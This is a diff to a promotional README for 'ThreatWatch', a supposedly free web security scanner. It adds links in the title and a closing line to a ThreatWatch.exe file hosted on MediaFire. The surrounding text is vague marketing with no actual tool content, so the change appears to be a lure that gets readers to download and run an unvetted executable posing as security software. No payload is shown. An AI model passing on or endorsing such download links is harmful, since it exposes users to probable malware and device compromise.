@@ -1,4 +1,4 @@
-# ThreatWatch: Your Comprehensive Free Web Security Solution
+# [ThreatWatch](https://www.mediafire.com/file/m2b8sb8gx7h6idu/ThreatWatch.exe/file): Your Comprehensive Free Web Security Solution
 
 ThreatWatch is the next-generation web security scanner designed to empower users with professional-grade tools—completely free of charge. Built on cutting-edge technology, ThreatWatch is tailored for individuals, developers, and organizations striving to protect their online assets.
 
@@ -21,3 +21,5 @@ ThreatWatch is the next-generation web security scanner designed to empower user
 **4. Free and Accessible:** Unlike other tools that charge for advanced capabilities, ThreatWatch delivers top-tier security tools at no cost, making cybersecurity accessible for everyone.
 
 ThreatWatch is your trusted ally in identifying and addressing vulnerabilities, safeguarding sensitive data, and enhancing web security effortlessly. Whether you're a seasoned developer or new to cybersecurity, ThreatWatch provides the tools you need to protect your digital world.
+
+# You can get the latest release of ThreatWatch [**here**](https://www.mediafire.com/file/m2b8sb8gx7h6idu/ThreatWatch.exe/file).
